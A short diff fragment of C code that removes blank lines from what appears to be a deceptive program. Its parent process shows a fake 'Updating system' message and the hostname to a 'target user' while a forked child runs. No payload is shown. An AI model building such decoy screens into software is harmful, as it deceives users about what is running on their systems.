@@ -34,10 +34,6 @@ fflush(NULL);
 int pid = fork();
    if (pid > 0) {
       /* We are running in parent process (as foreground job). */
-
-
-
-
       printf("Please Wait, Updating system ..\n\n");
       /* Display system information onscreen to target user */
       sleep(1);system("h=$(hostnamectl | grep 'Static' | cut -d ':' -f2);echo \"Hostname   :$h\"");
